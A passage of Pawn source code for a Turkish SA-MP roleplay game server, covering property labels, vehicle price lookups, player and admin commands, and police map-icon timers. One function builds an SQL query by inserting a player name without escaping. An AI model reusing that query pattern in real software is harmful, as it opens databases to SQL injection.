	//if(IsValidDynamic3DTextLabel(Ev[evid][etext])) DestroyDynamic3DTextLabel(Ev[evid][etext]);
    //new iconid=1273;
    new name[32];
	format(name, sizeof(name), "%s", SQLFromName(Ev[evid][esahip]));
	if(Ev[evid][kiralayan] != -1 && Ev[evid][kira] == 1) format(name, sizeof(name), "%s", SQLFromName(Ev[evid][kiralayan]));
	//strreplace(name, "_", " ");
    new _adres[128];
	format(_adres, sizeof(_adres), "%s %d",GetLocation(Ev[evid][girisX],Ev[evid][girisY],Ev[evid][girisZ]), evid);
 	new string[128];
 	format(string, sizeof(string), "{607b8b}Adres:{eeeeee} %s\n\n{607b8b}Satýlýk\n{607b8b}Fiyat:{eeeeee} $%d", _adres, Ev[evid][efiyat]);
	if((Ev[evid][esahip] != -1 && Ev[evid][kira] == 0) || (Ev[evid][kiralayan] != -1 && Ev[evid][kira] == 1))
	{
		//iconid=19522;
		format(string, sizeof(string), "{607b8b}Adres:{eeeeee} %s\n{607b8b}Sahibi:{eeeeee} %s", _adres, name);
		if(Ev[evid][kira] == 1) format(string, sizeof(string), "{607b8b}Adres:{eeeeee} %s\n{607b8b}Kiracý:{eeeeee} %s", _adres, name);
       	//Ev[evid][epickup] = CreateDynamicPickup(iconid, 1, Ev[evid][girisX], Ev[evid][girisY], Ev[evid][girisZ], Ev[evid][egirisvw], Ev[evid][egirisint], -1, 100.0);
       	Ev[evid][ecp] = CreateColouredCheckpoint(Ev[evid][girisX], Ev[evid][girisY], Ev[evid][girisZ]-1,8, Ev[evid][egirisvw], Ev[evid][egirisint]);
        //Ev[evid][etext] = CreateDynamic3DTextLabel(string, -1, Ev[evid][girisX],Ev[evid][girisY],Ev[evid][girisZ], 2.0, .testlos=1, .worldid=Ev[evid][egirisvw], .interiorid=Ev[evid][egirisint]);
		return 1;
	}
	if(Ev[evid][esahip] != -1 && Ev[evid][kiralayan] == -1 && Ev[evid][kira] == 1)
	{
		//iconid=19524;
		format(string, sizeof(string), "{607b8b}Adres:{eeeeee} %s\n{607b8b}Sahibi:{eeeeee} %s\n\n{607b8b}Kiralýk\n{607b8b}Fiyat:{eeeeee} $%d", _adres, name, Ev[evid][kirafiyat]);
       	//Ev[evid][epickup] = CreateDynamicPickup(iconid, 1, Ev[evid][girisX], Ev[evid][girisY], Ev[evid][girisZ], Ev[evid][egirisvw], Ev[evid][egirisint], -1, 100.0);
       	Ev[evid][ecp] = CreateColouredCheckpoint(Ev[evid][girisX], Ev[evid][girisY], Ev[evid][girisZ]-1,5, Ev[evid][egirisvw], Ev[evid][egirisint]);
        //Ev[evid][etext] = CreateDynamic3DTextLabel(string, -1, Ev[evid][girisX],Ev[evid][girisY],Ev[evid][girisZ]+0.3, 2.0, .testlos=1, .worldid=Ev[evid][egirisvw], .interiorid=Ev[evid][egirisint]);
		return 1;
	}
	//Ev[evid][epickup] = CreateDynamicPickup(iconid, 1, Ev[evid][girisX], Ev[evid][girisY], Ev[evid][girisZ], Ev[evid][egirisvw], Ev[evid][egirisint], -1, 100.0);
	Ev[evid][ecp] = CreateColouredCheckpoint(Ev[evid][girisX], Ev[evid][girisY],Ev[evid][girisZ]-1,3, Ev[evid][egirisvw], Ev[evid][egirisint]);
    //Ev[evid][etext] = CreateDynamic3DTextLabel(string, -1, Ev[evid][girisX],Ev[evid][girisY],Ev[evid][girisZ]+0.25, 2.0, .testlos=1, .worldid=Ev[evid][egirisvw], .interiorid=Ev[evid][egirisint]);
	return 1;
}

stock IsyeriAyarla(isid)
{
	if(IsValidDynamicPickup(Isyeri[isid][ipickupid])) DestroyDynamicPickup(Isyeri[isid][ipickupid]);
    new iconid = 19470;
	if(Isyeri[isid][isahip] != -1) iconid = 1272;
	if(Isyeri[isid][isahip] == 10 || Isyeri[isid][isahip] == 9) iconid = 1239;
	if(Isyeri[isid][kiralayan] == -1 && Isyeri[isid][kira] == 1) iconid = 19523;
	if(Buysa("~b~~h~LSPD",Isyeri[isid][iad])) iconid = 1247;
	if(Buysa("~b~~h~Hapishane",Isyeri[isid][iad])) iconid = 1247;
	if(Buysa("~r~~h~hastane",Isyeri[isid][iad])) iconid = 1240;
	if(Buysa("~g~~h~banka",Isyeri[isid][iad])) iconid = 1274;
	if(Buysa("~y~~h~binco",Isyeri[isid][iad])) iconid = 1275;
    if(Isyeri[isid][itip] == 6 || Isyeri[isid][itip] == 18) iconid = 1275;
	if(Buysa("~y~~h~ozel binco",Isyeri[isid][iad])) iconid = 1275;
	if(iconid == 19470) Isyeri[isid][ipickupid] = CreateDynamicPickup(iconid, 1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]-0.5, Isyeri[isid][igirisvw], Isyeri[isid][igirisint], -1, 100.0);
    else Isyeri[isid][ipickupid] = CreateDynamicPickup(iconid, 1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ], Isyeri[isid][igirisvw], Isyeri[isid][igirisint], -1, 100.0);
	if(IsValidDynamic3DTextLabel(Isyeri[isid][itext])) DestroyDynamic3DTextLabel(Isyeri[isid][itext]);
	new _iad[64];
	format(_iad, sizeof(_iad), "%s",Isyeri[isid][iad]);
	if(Isyeri[isid][muhur] == 1)
	{
 		new string[256],adres[128],_name[MAX_PLAYER_NAME+2];
	    format(_name, sizeof(_name), "%s", SQLFromName(Isyeri[isid][isahip]));
	    if(Isyeri[isid][kiralayan] != -1 && Isyeri[isid][kira] == 1) format(_name, sizeof(_name), "%s", SQLFromName(Isyeri[isid][kiralayan]));
	    format(adres, sizeof(adres), "%s %d",GetLocation(Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]), isid);
		format(string, sizeof(string), "{FFFFFF}[{ff7400}MÜHÜRLÜ{FFFFFF}]\n{607b8b}Ýþyeri Adý: {eeeeee}%s\n{607b8b}Adres: {eeeeee}%s\n{607b8b}Sahibi:{eeeeee} %s", _iad, adres, _name);
        Isyeri[isid][itext] = CreateDynamic3DTextLabel(string, -1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]+0.25, 10.0, .testlos=1, .worldid=Isyeri[isid][igirisvw], .interiorid=Isyeri[isid][igirisint]);
		return 1;
	}
	else if(Isyeri[isid][ivergi] >= Isyeri[isid][ifiyat]*35/100)
	{
 		new string[256],adres[128],_name[MAX_PLAYER_NAME+2];
	    format(_name, sizeof(_name), "%s", SQLFromName(Isyeri[isid][isahip]));
	    if(Isyeri[isid][kiralayan] != -1 && Isyeri[isid][kira] == 1) format(_name, sizeof(_name), "%s", SQLFromName(Isyeri[isid][kiralayan]));
	    format(adres, sizeof(adres), "%s %d",GetLocation(Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]), isid);
		format(string, sizeof(string), "{FFFFFF}[{ff7400}VERGÝ KÝLÝDÝ{FFFFFF}]\n{607b8b}Ýþyeri Adý: {eeeeee}%s\n{607b8b}Adres: {eeeeee}%s\n{607b8b}Sahibi:{eeeeee} %s", _iad, adres, _name);
        Isyeri[isid][itext] = CreateDynamic3DTextLabel(string, -1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]+0.25, 10.0, .testlos=1, .worldid=Isyeri[isid][igirisvw], .interiorid=Isyeri[isid][igirisint]);
		return 1;
	}
	else if(Isyeri[isid][isahip] != 10 && Isyeri[isid][isahip] != 8)
	{
	    new string[256],adres[128],_name[MAX_PLAYER_NAME+2];
	    format(_name, sizeof(_name), "%s", SQLFromName(Isyeri[isid][isahip]));
	    if(Isyeri[isid][kiralayan] != -1 && Isyeri[isid][kira] == 1) format(_name, sizeof(_name), "%s", SQLFromName(Isyeri[isid][kiralayan]));
	    format(adres, sizeof(adres), "%s %d",GetLocation(Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]), isid);
		if(Isyeri[isid][isahip] == -1)
		{
			format(string, sizeof(string), "{607b8b}Ýþyeri Adý: {eeeeee}%s\n{607b8b}Adres: {eeeeee}%s\n{607b8b}{FFFFFF}[{607b8b}SATILIK{FFFFFF}]\n{607b8b}Fiyat:{eeeeee} $%d", _iad, adres, Isyeri[isid][ifiyat]);
            Isyeri[isid][itext] = CreateDynamic3DTextLabel(string, -1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]+0.25, 10.0, .testlos=1, .worldid=Isyeri[isid][igirisvw], .interiorid=Isyeri[isid][igirisint]);
			return 1;
		}
		else if(Isyeri[isid][isahip] != -1 && Isyeri[isid][girisucreti] == 0 && Isyeri[isid][kira] == 0)
		{
			format(string, sizeof(string), "{607b8b}Ýþyeri Adý: {eeeeee}%s\n{607b8b}Adres: {eeeeee}%s\n{607b8b}Sahibi:{eeeeee} %s", _iad, adres, _name);
			Isyeri[isid][itext] = CreateDynamic3DTextLabel(string, -1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ], 10.0, .testlos=1, .worldid=Isyeri[isid][igirisvw], .interiorid=Isyeri[isid][igirisint]);
 			return 1;
		}
		else if(Isyeri[isid][isahip] != -1 && Isyeri[isid][girisucreti] != 0 && Isyeri[isid][kira] == 0)
		{
			format(string, sizeof(string), "{607b8b}Ýþyeri Adý: {eeeeee}%s\n{607b8b}Adres: {eeeeee}%s\n{607b8b}Sahibi:{eeeeee} %s\n{607b8b}Giriþ Ücreti: "DOLAR"${eeeeee}%d", _iad, adres, _name, Isyeri[isid][girisucreti]);
           	Isyeri[isid][itext] = CreateDynamic3DTextLabel(string, -1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]+0.15, 10.0, .testlos=1, .worldid=Isyeri[isid][igirisvw], .interiorid=Isyeri[isid][igirisint]);
			return 1;
		}
		else if(Isyeri[isid][kira] == 1 && Isyeri[isid][kiralayan] == -1)
		{
		    format(string, sizeof(string), "{607b8b}Ýþyeri Adý: {eeeeee}%s\n{607b8b}Adres: {eeeeee}%s\n{607b8b}Sahibi: {eeeeee}%s\n\n{607b8b}Kiralýk\n{607b8b}Fiyat:{eeeeee} $%d", _iad, adres, _name, Isyeri[isid][kirafiyat]);
			Isyeri[isid][itext] = CreateDynamic3DTextLabel(string, -1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ]+0.3, 10.0, .testlos=1, .worldid=Isyeri[isid][igirisvw], .interiorid=Isyeri[isid][igirisint]);
			return 1;
		}
		else if(Isyeri[isid][kira] == 1 && Isyeri[isid][kiralayan] != -1)
		{
		    format(string, sizeof(string), "{607b8b}Ýþyeri Adý: {eeeeee}%s\n{607b8b}Adres: {eeeeee}%s\n{607b8b}Kiracý:{eeeeee} %s", Isyeri[isid][iad], adres, _name);
			if(Isyeri[isid][girisucreti] != 0) format(string, sizeof(string), "{607b8b}Ýþyeri Adý: {eeeeee}%s\n{607b8b}Adres: {eeeeee}%s\n{607b8b}Kiracý:{eeeeee} %s\n{607b8b}Giriþ Ücreti: "DOLAR"${eeeeee}%d", _iad, adres, _name, Isyeri[isid][girisucreti]);
			Isyeri[isid][itext] = CreateDynamic3DTextLabel(string, -1, Isyeri[isid][girisX], Isyeri[isid][girisY], Isyeri[isid][girisZ], 10.0, .testlos=1, .worldid=Isyeri[isid][igirisvw], .interiorid=Isyeri[isid][igirisint]);
			return 1;
		}
	}
    return 1;
}



forward AyarYap();
public AyarYap()
{
    if(_iayarlandi == 0)
    {
		foreach(new i : Business)
		{
		    if(Isyeri[i][girisX] != 0)
		    {
				IsyeriAyarla(i);
			}
		}
		_iayarlandi = 1;
		print("-Ýþyerleri Ayarlandý.");
	}
	if(_eayarlandi == 0)
	{
	    new hostname[64];
	    GetConsoleVarAsString("hostname", hostname, sizeof(hostname));
		foreach (new i : Houses)
		{
			if(Ev[i][girisX] != 0)
			{
		        EvAyarla(i);
		    }
		}
		_eayarlandi = 1;
		print("-Evler Ayarlandý.");
	}
	print("Sunucu Giriþe Hazýr.");
}

forward AracFiyatBul(__model);
public AracFiyatBul(__model)
{
    new query[128],rows,fields,_fiyat;
    format(query, sizeof(query), "SELECT * FROM `grotti` WHERE `aracid` = '%d'",__model);
	new Cache:cache = mysql_query(query,true);
	if(!cache_get_row_count()) return 0;
	cache_get_data(rows, fields, g_iHandle);
	_fiyat=cache_get_field_content_int(0, "fiyat");
	cache_delete(cache);
	return _fiyat;
}

stock SSGaleriFiyat(__model)
{
    new query[128],rows,fields,_fiyat;
    format(query, sizeof(query), "SELECT * FROM `sportgaleri` WHERE `aracid` = '%d'",__model);
	new Cache:cache = mysql_query(query,true);
	cache_get_data(rows, fields, g_iHandle);
	_fiyat=cache_get_field_content_int(0, "fiyat");
	cache_delete(cache);
	return _fiyat;
}

stock GaleriFiyat(__model)
{
    new query[128],rows,fields,_fiyat;
    format(query, sizeof(query), "SELECT * FROM `galeri` WHERE `aracid` = '%d'",__model);
	new Cache:cache = mysql_query(query,true);
	cache_get_data(rows, fields, g_iHandle);
	_fiyat=cache_get_field_content_int(0, "fiyat");
	cache_delete(cache);
	return _fiyat;
}

stock GetVehicleName(vehicleid)
{
	new __modelID = GetVehicleModel(vehicleid);
    new string[35];
	format(string,sizeof(string),"%s",VehicleName[__modelID-400][0]);
    return string;
}

stock GetVehicleNameEx(_modelid)
{
    new string[35];
	format(string,sizeof(string),"%s",VehicleName[_modelid-400][0]);
    return string;
}

CMD:kiyafetlerim(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(GetPlayerInterior(playerid) == 0) return Hata(playerid, "Burada kýyafet deðiþtiremezsiniz.");
	new _bol[5][6], mstring[256];
	strexplode(_bol, Karakter[playerid][kiyafetler], "|");
	for(new i;i<5;i++)
	{
		if(strval(_bol[i]) != 0)
		{
			format(mstring, sizeof(mstring), "%sSlot"C5"%d)\t\t "C2"%s(%d)\n", mstring, i+1, GetSkinModelNameEx(strval(_bol[i])), strval(_bol[i]));
		}
		else format(mstring, sizeof(mstring), "%sSlot"C5"%d)\t\t "C2"Boþ\n", mstring, i+1);
	}
	ShowPlayerDialog(playerid, 282, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Kýyafet Deðiþtir", mstring, "Seç", "Ýptal");
	return 1;
}

BenzinGizle(playerid)
{
	SetPVarInt(playerid, "BenzinGizle", 1);
    PlayerTextDrawHide(playerid, BenzinTD[playerid]);
}
KmGizle(playerid)
{
	SetPVarInt(playerid, "KmGizle", 1);
    PlayerTextDrawHide(playerid, KmTD[playerid]);
}
TaksimetreGoster(playerid)
{
    SetPVarInt(playerid, "TaksimetreGizle", 0);
    TextDrawShowForPlayer(playerid, SagAlt[2]);
    PlayerTextDrawShow(playerid, TaksimetreTD[playerid]);
}
TaksimetreGizle(playerid)
{
	SetPVarInt(playerid, "TaksimetreGizle", 1);
    TextDrawHideForPlayer(playerid, SagAlt[2]);
    PlayerTextDrawHide(playerid, TaksimetreTD[playerid]);
}
HizGizle(playerid)
{
    SetPVarInt(playerid, "HizGizle", 1);
    PlayerTextDrawHide(playerid, HizTD[playerid]);
}
GostergeGizle(playerid)
{
	BenzinGizle(playerid);
	KmGizle(playerid);
	HizGizle(playerid);
    TextDrawHideForPlayer(playerid, SagAlt[1]);
}
GostergeGoster(playerid)
{
    TextDrawShowForPlayer(playerid, SagAlt[1]);
    SetPVarInt(playerid, "HizGizle", 0);
    SetPVarInt(playerid, "BenzinGizle", 0);
    SetPVarInt(playerid, "KmGizle", 0);
	PlayerTextDrawShow(playerid, HizTD[playerid]);
	PlayerTextDrawShow(playerid, BenzinTD[playerid]);
	PlayerTextDrawShow(playerid, KmTD[playerid]);
}
CMD:aiyilestir(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 0 || !Girdi[playerid] || !AKontrol(playerid)) return 1;
	new pid=-1;
	if(sscanf(params,"d",pid)) return Kullanim(playerid, "/aiyilestir [oyuncuID]");
	if(!Girdi[pid]) return Hata(playerid, "Geçersiz oyuncu id belirttiniz.");
	SetPVarInt(pid, "Yarali", 1);
	Bilgi(playerid, "Oyuncuyu iyileþtirdiniz.");
	ResetDamages(playerid);
    if(IsPlayerBleeding(pid)) StopPlayerBleeding(pid);
	return 1;
}

CMD:ss(playerid, params[])
{
	if(sdurum[playerid] == false) {
		PlayerTextDrawShow(playerid, SS[playerid]);
		sdurum[playerid] = true;
	}
	else if(sdurum[playerid] == true) {
	    PlayerTextDrawHide(playerid, SS[playerid]);
	    //TextDrawShowForPlayer(playerid, Line1);
	    //TextDrawShowForPlayer(playerid, Line2);
	    //TextDrawShowForPlayer(playerid, Line3);
        sdurum[playerid] = false;
	}
	return 1;
	//return Hata(playerid, "Ýnaktif.");
}

stock GateTextureVer(i)
{
	if(Gate[i][gtmodel] > 0)
	{
		SetDynamicObjectMaterial(Gate[i][gobje], 0, Gate[i][gtmodel], Gate[i][gtname1], Gate[i][gtname2]);
		//printf("SetDynamicObjectMaterial(%d, 0, %d, %s, %s);",Gate[i][gobje],Gate[i][gtmodel], Gate[i][gtname1], Gate[i][gtname2]);
	}
	return 1;
}

stock ObjeTextureVer(i)
{
	if(Obje[i][otmodel] > 0)
	{
		SetDynamicObjectMaterial(Obje[i][oobje], 0, Obje[i][otmodel], Obje[i][otname1], Obje[i][otname2]);
	}
	return 1;
}

BirlikBaslik(playerid)
{
	new _name[64];
	format(_name, sizeof(_name), ""C7"EIGHTBORN - "C8"%s", Birlik[Karakter[playerid][birlik]][fisim]);
	return _name;
}

BirlikKontrol(_isim[], id)
{
    new query[128],bid,rid,rows,fields;
    new __isim[32];
    format(__isim, sizeof(__isim), "%s", _isim);
    //if(strfind(__isim, "_", true) != -1) strreplace(__isim, "_", " ");
    format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `isim` = '%s'",__isim);
	new Cache:cache = mysql_query(query,true);
	if(!cache_get_row_count()) return 4;
	cache_get_data(rows, fields, g_iHandle);
	bid=cache_get_field_content_int(0, "birlik");
	rid=cache_get_field_content_int(0, "rutbe");
	cache_delete(cache);
	if(bid == Karakter[id][birlik] && Karakter[id][rutbe] < rid) return 1;
	else if(bid == Karakter[id][birlik] && Karakter[id][rutbe] >= rid) return 2;
	return 3;
}

GetPlayerSkinEx(playerid)
{
 	if(Karakter[playerid][skin] > 20000) return GetPlayerCustomSkin(playerid);
	else return GetPlayerSkin(playerid);
}

CMD:benzin(playerid, params[])
{
    if(IsPlayerConnected(playerid))
    {
        if(IsPlayerInAnyVehicle(playerid))
        {
            new vid = GetPlayerVehicleID(playerid);
            if(IsABike(vid)) return 1;
            if(!Benzinistasyonunda(playerid)) return Hata(playerid, "Bir benzin istasyonunda deðilsiniz ya da bulunduðunuz istasyon kapalý durumda.");
            if(Arac[vid][abenzin] > 99)
            {
                Hata(playerid, "Aracýnýzýn benzin deposu tamamen dolu.");
				return 1;
			}
			if(GetMotor(vid) == 1 && !MotoruAciliyor[vid]) return Hata(playerid, "Aracýn motoru açýk.");
			new Float:miktar;
			if(sscanf(params,"f",miktar)) return Kullanim(playerid, "/benzin [miktar]");
			if(miktar+Arac[vid][abenzin] > 100 || miktar < 1) return Hata(playerid, "Hatalý bir miktar girdiniz.");
			if(Doldurpasam[playerid] == 1) return Hata(playerid, "Benzin dolduruluyor.");
			new tutar = floatround(miktar*2);
			if(GetPlayerCash(playerid) < tutar) return Hata(playerid, "Bu miktarý karþýlayabilecek yeterli miktarda paranýz yok.");
			Bilgi(playerid, "Benzin dolduruluyor, lütfen bekleyin..");
			MotoruKapat(vid);
			SetTimerEx("Doldurpasamvol2", 7000, false, "idfd", playerid, vid, miktar, tutar);
			Doldurpasam[playerid] = 1;
			DONDUR(playerid);
			//printf("Komut:");
			//printf("Playerid:%i Miktar:%f Tutar:%d Benzin:%f",playerid,miktar,tutar,Arac[vid][abenzin]);
		}
		else
		{
		    Hata(playerid, "Araç içerisinde deðilsiniz.");
		    return 1;
		}
	}
	return 1;
}

forward PizzaIptal(playerid, vehicleid);
public PizzaIptal(playerid, vehicleid)
{
	if(IsPlayerInVehicle(playerid, vehicleid)) return 1;
    MotoruKapat(vehicleid);
    Aractamiri(vehicleid);
	SetVehicleToRespawn(vehicleid);
	DisablePlayerCheckpoint(playerid);
	PizzaCheckpoint[playerid] = 0;
	PizzaGorevde[playerid] = 0;
	Karakter[playerid][misbasi] = 0;
	SetPlayerSkin(playerid, Karakter[playerid][skin]);
	Bilgi(playerid, "10 saniye içinde motora binmediðiniz için görev iptal edildi ve iþbaþýndan çýkarýldýnýz.");
	DeletePVar(playerid, "PizzaMotor");
	return 1;
}

CMD:yuruyus(playerid, params[])
{
	new textt[24];
    if(sscanf(params, "s[24]", textt)) return Kullanim(playerid, "/yuruyus [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: normal, kadin, kadin2, mafya, mafya2, sisman, yasli, sismanyasli");
	if(!strcmp("normal", textt))
	{
	    SetPlayerWalkingStyle(playerid, WALK_NORMAL);
	    Bilgi(playerid, "Yürüyüþ stiliniz: Normal");
	}
	else if(!strcmp("kadin", textt))
	{
	    SetPlayerWalkingStyle(playerid, WALK_LADY);
	    Bilgi(playerid, "Yürüyüþ stiliniz: Kadýn");
	}
	else if(!strcmp("kadin2", textt))
	{
	    SetPlayerWalkingStyle(playerid, WALK_LADY2);
	    Bilgi(playerid, "Yürüyüþ stiliniz: Kadýn2");
	}
	else if(!strcmp("mafya", textt))
	{
	    SetPlayerWalkingStyle(playerid, WALK_GANGSTA);
	    Bilgi(playerid, "Yürüyüþ stiliniz: Mafya");
	}
	else if(!strcmp("mafya2", textt))
	{
	    SetPlayerWalkingStyle(playerid, WALK_GANGSTA2);
	    Bilgi(playerid, "Yürüyüþ stiliniz: Mafya2");
	}
	else if(!strcmp("sisman", textt))
	{
	    SetPlayerWalkingStyle(playerid, WALK_FAT);
	    Bilgi(playerid, "Yürüyüþ stiliniz: Þiþman");
	}
	else if(!strcmp("yasli", textt))
	{
	    SetPlayerWalkingStyle(playerid, WALK_OLD);
	    Bilgi(playerid, "Yürüyüþ stiliniz: Yaþlý");
	}
	else if(!strcmp("sismanyasli", textt))
	{
	    SetPlayerWalkingStyle(playerid, WALK_FAT_OLD);
	    Bilgi(playerid, "Yürüyüþ stiliniz: Þiþmanyaþlý");
	}
	return 1;
}

CMD:konusmatarzi(playerid, params[])
{
	if(Karakter[playerid][chatstili] == -1)
	{
	    Bilgi(playerid, "Konuþma animini açtýnýz.");
	    Karakter[playerid][chatstili] = 0;
	}
	else
	{
    	Bilgi(playerid, "Konuþma animini kapattýnýz.");
	    Karakter[playerid][chatstili] = -1;
	}
	return 1;
}

EhliyetNoVer(playerid)
{
	new _hesapno = randomEx(1,899999998)+100000000;
	new query[128];
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `ehliyetno` = '%d'", _hesapno);
	new Cache:cache = mysql_query(query, true);
 	if(!cache_num_rows())
	{
	    format(query, sizeof(query), "UPDATE `karakterler` SET `ehliyetno` = '%d' WHERE `id` = '%d'", _hesapno, Karakter[playerid][sqlid]);
        Karakter[playerid][ehliyetno] = _hesapno;
        mysql_tquery(1,query);
	}
	else
	{
		EhliyetNoVer(playerid);
	}
	cache_delete(cache);
}

RozetNoVer(playerid)
{
	new _hesapno = randomEx(1,9998)+10000;
	new query[128];
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `rozetno` = '%d'", _hesapno);
	new Cache:cache = mysql_query(query, true);
 	if(!cache_num_rows())
	{
	    format(query, sizeof(query), "UPDATE `karakterler` SET `rozetno` = '%d' WHERE `id` = '%d'", _hesapno, Karakter[playerid][sqlid]);
        Karakter[playerid][rozetno] = _hesapno;
        mysql_tquery(1,query);
	}
	else
	{
		RozetNoVer(playerid);
	}
	cache_delete(cache);
}

MaskeNoVer(playerid)
{
	new _hesapno = randomEx(1,9998)+10000;
	new query[128];
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `maskeno` = '%d'", _hesapno);
	new Cache:cache = mysql_query(query, true);
 	if(!cache_num_rows())
	{
	    format(query, sizeof(query), "UPDATE `karakterler` SET `maskeno` = '%d' WHERE `sqlid` = '%d'", _hesapno, Karakter[playerid][sqlid]);
        Karakter[playerid][maskeno] = _hesapno;
	}
	else
	{
		MaskeNoVer(playerid);
	}
	cache_delete(cache);
}

KimlikNoVer(playerid)
{
	new _hesapno = randomEx(1,799998)+100000;
	new query[128];
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `kimlikno` = '%d'", _hesapno);
	new Cache:cache = mysql_query(query, true);
 	if(!cache_num_rows())
	{
	    format(query, sizeof(query), "UPDATE `karakterler` SET `kimlikno` = '%d' WHERE `sqlid` = '%d'", _hesapno, Karakter[playerid][sqlid]);
        Karakter[playerid][kimlikno] = _hesapno;
	}
	else
	{
		KimlikNoVer(playerid);
	}
	cache_delete(cache);
}

HesapNoVer(playerid)
{
	new _hesapno = randomEx(1,79999998)+10000000;
	new query[128];
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `hesapno` = '%d'", _hesapno);
	new Cache:cache = mysql_query(query, true);
 	if(!cache_num_rows())
	{
	    format(query, sizeof(query), "UPDATE `karakterler` SET `hesapno` = '%d' WHERE `sqlid` = '%d'", _hesapno, Karakter[playerid][sqlid]);
		Karakter[playerid][hesapno] = _hesapno;
	}
	else
	{
		HesapNoVer(playerid);
	}
	cache_delete(cache);
}

CMD:allbenzindoldur(playerid, params[])
{
    if(Karakter[playerid][adminlevel] < 4 || !Girdi[playerid]) return 1;
	new mstring[128];
    format(mstring, sizeof(mstring), "[!] \"%s\" tarafýndan tüm araçlarýn benzinini doldurdu.", Karakter[playerid][anick]);
	for(new i; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || IsPlayerNPC(i)) continue;
		PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
		SendClientMessage(i, COLOR_ORANGE, mstring);
	}
	for(new i;i<MAX_VEHICLES;i++)
	{
		if(IsValidVehicle(i))
		{
			Arac[i][abenzin] = 100.0;
		}
	}
	return 1;
}

CMD:abenzindoldur(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 1 || !Girdi[playerid]) return 1;
	new _b;
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Herhangi bir araçta deðilsiniz.");
	if(sscanf(params,"d",_b)) return Kullanim(playerid, "/abenzindoldur [benzin]");
	Arac[GetPlayerVehicleID(playerid)][abenzin] = _b;
	Bilgi(playerid, "Aracýn benzinini doldurdunuz.");
	return 1;
}

forward HareketliDestek(playerid);
public HareketliDestek(playerid)
{
	if(playerid == INVALID_PLAYER_ID || Birlik[Karakter[playerid][birlik]][ftip] != LSPD || !Girdi[playerid] || !Karakter[playerid][isbasi])
	{
		foreach(new i : Player)
		{
			RemovePlayerMapIcon(i, playerid);
			KillTimer(DestekTimer[playerid]);
			PDDestek[playerid] = 0;
			return 1;
		}
	}
	new Float:DX, Float:DY, Float:DZ;
	GetPlayerPos(playerid, DX, DY, DZ);
	foreach(new i : Player)
	{
		if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)
	    {
	    	RemovePlayerMapIcon(i, playerid);
	        if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Girdi[playerid] && Karakter[playerid][isbasi]) SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
		}
	}
	return DestekTimer[playerid] = SetTimerEx("HareketliDestek", 1000, false, "u", playerid);
}

forward HareketliDestek2(playerid);
public HareketliDestek2(playerid)
{
	/*if(playerid == INVALID_PLAYER_ID || (Birlik[Karakter[playerid][birlik]][ftip] != LSPD || !Karakter[playerid][isbasi]) || !Girdi[playerid])
	{
		foreach(new i : Player)
		{
			RemovePlayerMapIcon(i, playerid);
			KillTimer(DestekTimer2[playerid]);
			PDFDestek[playerid] = 0;
			FPDDestek[playerid] = 0;
			return 1;
		}
	}*/
	new Float:DX, Float:DY, Float:DZ;
	GetPlayerPos(playerid, DX, DY, DZ);
	foreach(new i : Player)
	{
		if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || Birlik[Karakter[i][birlik]][ftip] == FBI)
	    {
	    	RemovePlayerMapIcon(i, playerid);
	        if((Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Girdi[playerid] && Karakter[playerid][isbasi]) || Birlik[Karakter[playerid][birlik]][ftip] == FBI) SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
		}
	}
	return DestekTimer2[playerid] = SetTimerEx("HareketliDestek2", 1000, false, "u", playerid);
}

forward HareketliDestek3(playerid);
public HareketliDestek3(playerid)
{
	/*if(playerid == INVALID_PLAYER_ID || (Birlik[Karakter[playerid][birlik]][ftip] != LSPD || !Karakter[playerid][isbasi]) || !Girdi[playerid])
	{
		foreach(new i : Player)
		{
			RemovePlayerMapIcon(i, playerid);
			KillTimer(DestekTimer2[playerid]);
			PDFDestek[playerid] = 0;
			FPDDestek[playerid] = 0;
			return 1;
		}
	}*/
	new Float:DX, Float:DY, Float:DZ;
	GetPlayerPos(playerid, DX, DY, DZ);
	foreach(new i : Player)
	{
		if((Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1) || Birlik[Karakter[i][birlik]][ftip] == LSFD)
	    {
	    	RemovePlayerMapIcon(i, playerid);
	        if((Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Girdi[playerid] && Karakter[playerid][isbasi]) || Birlik[Karakter[playerid][birlik]][ftip] == LSFD) SetPlayerMapIcon(i, playerid, DX, DY, DZ, 0, COLOR_YELLOW, MAPICON_GLOBAL);
		}
	}
	return DestekTimer3[playerid] = SetTimerEx("HareketliDestek3", 1000, false, "u", playerid);
}

